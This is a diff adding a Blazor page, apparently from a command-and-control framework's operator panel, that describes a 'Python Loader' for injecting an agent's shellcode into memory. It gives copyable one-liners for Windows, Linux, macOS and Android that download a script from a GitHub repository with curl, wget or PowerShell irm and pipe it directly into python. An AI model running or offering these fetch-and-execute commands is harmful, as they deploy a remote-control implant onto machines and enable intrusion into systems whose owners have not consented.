@@ -1,0 +1,74 @@
+@inject IJSRuntime JS
+
+<div class="tool-panel">
+    <div class="tool-header">
+        <h3 class="tool-title">Python Loader</h3>
+        <p class="tool-subtitle">Cross-platform loader for the position-independent agent — runs on Windows, Linux, macOS, and Android.</p>
+    </div>
+
+    <div class="loader-content">
+        <div class="loader-section">
+            <h4 class="loader-section-title">Overview</h4>
+            <p class="loader-text">
+                The Python loader injects the position-independent agent shellcode into memory using a
+                minimal Python script. No compilation required — works anywhere Python is installed.
+            </p>
+        </div>
+
+        <div class="loader-section">
+            <h4 class="loader-section-title">Supported Platforms</h4>
+            <div class="loader-platforms">
+                <span class="loader-platform"><C2Icon Name="monitor" Size="Size.Xs" /> Windows</span>
+                <span class="loader-platform"><C2Icon Name="terminal" Size="Size.Xs" /> Linux</span>
+                <span class="loader-platform"><C2Icon Name="terminal" Size="Size.Xs" /> macOS</span>
+                <span class="loader-platform"><C2Icon Name="smartphone" Size="Size.Xs" /> Android</span>
+            </div>
+        </div>
+
+        <div class="loader-section">
+            <h4 class="loader-section-title">One-Liners</h4>
+
+            <span class="loader-command-label">All Platforms including Android/Termux (curl)</span>
+            <div class="loader-command">
+                <code class="loader-code">curl https://raw.githubusercontent.com/mrzaxaryan/Position-Independent-Agent/main/tools/pyloader/load.py | python</code>
+                <button class="loader-copy-btn" @onclick='() => Copy("curl https://raw.githubusercontent.com/mrzaxaryan/Position-Independent-Agent/main/tools/pyloader/load.py | python")' title="Copy">
+                    <C2Icon Name="copy" Size="Size.Xs" />
+                </button>
+            </div>
+
+            <span class="loader-command-label">Linux / macOS (wget)</span>
+            <div class="loader-command">
+                <code class="loader-code">wget -qO- https://raw.githubusercontent.com/mrzaxaryan/Position-Independent-Agent/main/tools/pyloader/load.py | python</code>
+                <button class="loader-copy-btn" @onclick='() => Copy("wget -qO- https://raw.githubusercontent.com/mrzaxaryan/Position-Independent-Agent/main/tools/pyloader/load.py | python")' title="Copy">
+                    <C2Icon Name="copy" Size="Size.Xs" />
+                </button>
+            </div>
+
+            <span class="loader-command-label">Windows (PowerShell)</span>
+            <div class="loader-command">
+                <code class="loader-code">irm https://raw.githubusercontent.com/mrzaxaryan/Position-Independent-Agent/main/tools/pyloader/load.py | python</code>
+                <button class="loader-copy-btn" @onclick='() => Copy("irm https://raw.githubusercontent.com/mrzaxaryan/Position-Independent-Agent/main/tools/pyloader/load.py | python")' title="Copy">
+                    <C2Icon Name="copy" Size="Size.Xs" />
+                </button>
+            </div>
+        </div>
+
+        <div class="loader-section">
+            <h4 class="loader-section-title">Source</h4>
+            <p class="loader-text">
+                Full source code, usage instructions, and documentation are available on GitHub.
+            </p>
+            <button class="loader-link-btn" @onclick="OpenRepo">
+                <C2Icon Name="github" Size="Size.Xs" /> Open on GitHub
+            </button>
+        </div>
+    </div>
+</div>
+
+@code {
+    private const string RepoUrl = "https://github.com/mrzaxaryan/Position-Independent-Agent/tree/main/tools/pyloader";
+
+    private void OpenRepo() => _ = JS.InvokeVoidAsync("open", RepoUrl, "_blank");
+
+    private void Copy(string text) => _ = JS.InvokeVoidAsync("navigator.clipboard.writeText", text);
+}
